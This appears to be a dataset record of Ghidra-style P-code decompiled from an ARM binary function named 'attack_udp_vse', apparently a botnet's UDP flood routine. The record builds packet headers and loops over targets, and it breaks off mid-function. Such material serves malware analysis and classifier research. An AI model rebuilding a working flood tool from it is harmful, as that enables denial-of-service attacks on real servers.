Label: 859
Function: attack_udp_vse
Architecture: arm
Source File: Unknown
Entry Point: 00018f64

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021d, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x3d, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x55f, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x55f, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x55f, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x55f, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x55f, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x55f, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x55f, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x55f, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x55f, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x55f, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x55f, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x55f, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x55f, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x55f, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x55f, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x55f, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x566, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x566, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x566, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffc8, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffe7, 1)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x56e, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x56e, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x56e, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffc8, 4) , (const, 0x8, 4)
(register, 0x65, 1) INT_NOTEQUAL (stack, 0xffffffffffffffe6, 1) , (const, 0x0, 1)
 ---  CBRANCH (ram, 0x191d0, 1) , (register, 0x65, 1)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x4000, 2)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x590, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x590, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x590, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x590, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x590, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x590, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x590, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x590, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x590, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x590, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x590, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x590, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x590, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x590, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x590, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x590, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x590, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x597, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x597, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x597, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffc8, 4) , (const, 0x6, 4)
(ram, 0x19534, 4) MULTIEQUAL (ram, 0x19534, 4) , (ram, 0x19534, 4)
(ram, 0x19538, 4) MULTIEQUAL (ram, 0x19538, 4) , (ram, 0x19538, 4)
(ram, 0x1953c, 4) MULTIEQUAL (ram, 0x1953c, 4) , (ram, 0x1953c, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (stack, 0xffffffffffffffbc, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (const, 0x11, 1)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x5a8, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x5a8, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x5a8, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffc8, 4) , (const, 0x9, 4)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (ram, 0x1953c, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x1000015c, 4) , (register, 0x28, 4)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x5af, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x5af, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x5af, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffc8, 4) , (const, 0xc, 4)
(unique, 0x1000015c, 4) PTRSUB (unique, 0x10000245, 4) , (const, 0x0, 4)
(unique, 0x10000245, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x10000164, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffbc, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000164, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (register, 0x28, 4)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x5dc, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x5dc, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x5dc, 4)
(unique, 0x1000016c, 4) PTRSUB (stack, 0xffffffffffffffc8, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x10000249, 4) , (const, 0x4, 4)
(unique, 0x10000249, 4) PTRSUB (unique, 0x1000016c, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe4, 2)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x5e2, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x5e2, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x5e2, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x5e2, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000174, 4) , (register, 0x20, 2)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x5e9, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x5e9, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x5e9, 4)
(unique, 0x10000174, 4) PTRSUB (stack, 0xffffffffffffffc4, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffe2, 2)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x5ef, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x5ef, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x5ef, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x5ef, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x5f6, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x5f6, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x5f6, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffc4, 4) , (const, 0x2, 4)
(unique, 0x3b00, 4) INT_AND (stack, 0xffffffffffffffb8, 4) , (const, 0xffff, 4)
(register, 0x2c, 4) INT_ADD (unique, 0x3b00, 4) , (const, 0xc, 4)
(unique, 0x3580, 4) INT_MULT (register, 0x2c, 4) , (const, 0x10000, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x20, 2)
(register, 0x20, 2) SUBPIECE (unique, 0x100001fd, 4) , (const, 0x0, 4)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x62f, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x62f, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x62f, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x62f, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x62f, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x62f, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x62f, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x62f, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x62f, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x62f, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x62f, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x62f, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x62f, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x62f, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x62f, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x62f, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x62f, 4)
(unique, 0x100001fd, 4) INT_RIGHT (unique, 0x3580, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x636, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x636, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x636, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffc4, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000205, 4) , (const, 0xff, 1)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x646, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x646, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x646, 4)
(unique, 0x10000201, 4) COPY (stack, 0xffffffffffffffc0, 4)
(unique, 0x10000205, 4) PTRADD (unique, 0x10000201, 4) , (const, 0x0, 4) , (const, 0x1, 4)
(unique, 0x10000209, 4) PTRADD (unique, 0x10000201, 4) , (const, 0x1, 4) , (const, 0x1, 4)
(unique, 0x1000020d, 4) PTRADD (unique, 0x10000201, 4) , (const, 0x2, 4) , (const, 0x1, 4)
(unique, 0x10000211, 4) PTRADD (unique, 0x10000201, 4) , (const, 0x3, 4) , (const, 0x1, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000209, 4) , (const, 0xff, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x1000020d, 4) , (const, 0xff, 1)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000211, 4) , (const, 0xff, 1)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffc0, 4) , (const, 0x4, 4) , (const, 0x1, 4)
 ---  CALL (ram, 0x1e088, 8) , (register, 0x2c, 4) , (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffb8, 4)
(ram, 0x19534, 4) INDIRECT (ram, 0x19534, 4) , (const, 0x65f, 4)
(ram, 0x19538, 4) INDIRECT (ram, 0x19538, 4) , (const, 0x65f, 4)
(ram, 0x1953c, 4) INDIRECT (ram, 0x1953c, 4) , (const, 0x65f, 4)
(stack, 0xffffffffffffffb8, 4) INDIRECT (stack, 0xffffffffffffffb8, 4) , (const, 0x65f, 4)
(stack, 0xffffffffffffffbc, 4) INDIRECT (stack, 0xffffffffffffffbc, 4) , (const, 0x65f, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (register, 0x2c, 4) , (const, 0x65f, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x65f, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x65f, 4)
(stack, 0xffffffffffffffd8, 4) INDIRECT (stack, 0xffffffffffffffd8, 4) , (const, 0x65f, 4)
(stack, 0xffffffffffffffdc, 4) INDIRECT (stack, 0xffffffffffffffdc, 4) , (const, 0x65f, 4)
(stack, 0xffffffffffffffe2, 2) INDIRECT (stack, 0xffffffffffffffe2, 2) , (const, 0x65f, 4)
(stack, 0xffffffffffffffe4, 2) INDIRECT (stack, 0xffffffffffffffe4, 2) , (const, 0x65f, 4)
(stack, 0xffffffffffffffe6, 1) INDIRECT (stack, 0xffffffffffffffe6, 1) , (const, 0x65f, 4)
(stack, 0xffffffffffffffe7, 1) INDIRECT (stack, 0xffffffffffffffe7, 1) , (const, 0x65f, 4)
(stack, 0xffffffffffffffe8, 2) INDIRECT (stack, 0xffffffffffffffe8, 2) , (const, 0x65f, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x65f, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x65f, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffbc, 4) , (const, 0x1, 4)
(register, 0x28, 4) INT_ZEXT (register, 0x20, 1)
(ram, 0x19534, 4) MULTIEQUAL (ram, 0x19534, 4) , (ram, 0x19534, 4)
(ram, 0x19538, 4) MULTIEQUAL (ram, 0x19538, 4) , (ram, 0x19538, 4)
(ram, 0x1953c, 4) MULTIEQUAL (ram, 0x1953c, 4) , (ram, 0x1953c, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffbc, 4) MULTIEQUAL (stack, 0xffffffffffffffbc, 4) , (register, 0x2c, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(unique, 0x2480, 1) INT_SLESS (stack, 0xffffffffffffffbc, 4) , (unique, 0x10000221, 4)
 ---  CBRANCH (ram, 0x190cc, 1) , (unique, 0x2480, 1)
(unique, 0x10000221, 4) CAST (register, 0x28, 4)
(ram, 0x19534, 4) MULTIEQUAL (ram, 0x19534, 4) , (ram, 0x19534, 4)
(ram, 0x19538, 4) MULTIEQUAL (ram, 0x19538, 4) , (ram, 0x19538, 4)
(ram, 0x1953c, 4) MULTIEQUAL (ram, 0x1953c, 4) , (ram, 0x1953c, 4)
(stack, 0xffffffffffffffb8, 4) MULTIEQUAL (stack, 0xffffffffffffffb8, 4) , (stack, 0xffffffffffffffb8, 4)
(stack, 0xffffffffffffffc0, 4) MULTIEQUAL (stack, 0xffffffffffffffc0, 4) , (stack, 0xffffffffffffffc0, 4)
(stack, 0xffffffffffffffc4, 4) MULTIEQUAL (stack, 0xffffffffffffffc4, 4) , (stack, 0xffffffffffffffc4, 4)
(stack, 0xffffffffffffffc8, 4) MULTIEQUAL (stack, 0xffffffffffffffc8, 4) , (stack, 0xffffffffffffffc8, 4)
(stack, 0xffffffffffffffd8, 4) MULTIEQUAL (stack, 0xffffffffffffffd8, 4) , (stack, 0xffffffffffffffd8, 4)
(stack, 0xffffffffffffffdc, 4) MULTIEQUAL (stack, 0xffffffffffffffdc, 4) , (stack, 0xffffffffffffffdc, 4)
(stack, 0xffffffffffffffe2, 2) MULTIEQUAL (stack, 0xffffffffffffffe2, 2) , (stack, 0xffffffffffffffe2, 2)
(stack, 0xffffffffffffffe4, 2) MULTIEQUAL (stack, 0xffffffffffffffe4, 2) , (stack, 0xffffffffffffffe4, 2)
(stack, 0xffffffffffffffe6, 1) MULTIEQUAL (stack, 0xffffffffffffffe6, 1) , (stack, 0xffffffffffffffe6, 1)
(stack, 0xffffffffffffffe7, 1) MULTIEQUAL (stack, 0xffffffffffffffe7, 1) , (stack, 0xffffffffffffffe7, 1)
(stack, 0xffffffffffffffe8, 2) MULTIEQUAL (stack, 0xffffffffffffffe8, 2) , (stack, 0xffffffffffffffe8, 2)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
(stack, 0xffffffffffffffbc, 4) COPY (const, 0x0, 4)
 ---  BRANCH (ram, 0x19514, 1)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffbc, 4) , (const, 0x4, 4)
(unique, 0x10000251, 4) LOAD (const, 0x1a1, 4) , (register, 0x2c, 4)
(register, 0x2c, 4) CAST (unique, 0x10000251, 4)
(unique, 0x10000255, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x14, 4)
(register, 0x2c, 4) CAST (unique, 0x10000255, 4)
(unique, 0x43980, 1) LOAD (const, 0x1a1, 4) , (unique, 0x8280, 4)
(unique, 0x1000018c, 4) PTRADD (register, 0x24, 4) , (stack, 0xffffffffffffffbc, 4) , (const, 0x18, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x1000018c, 4) , (const, 0x14, 4)
(unique, 0x1f00, 1) INT_LESS (unique, 0x43980, 1) , (const, 0x20, 1)
 ---  CBRANCH (ram, 0x193b4, 1) , (unique, 0x1f00, 1)
(unique, 0x10000219, 4) COPY (unique, 0x10000259, 4)
(unique, 0x10000259, 4) CAST (register, 0x2c, 4)
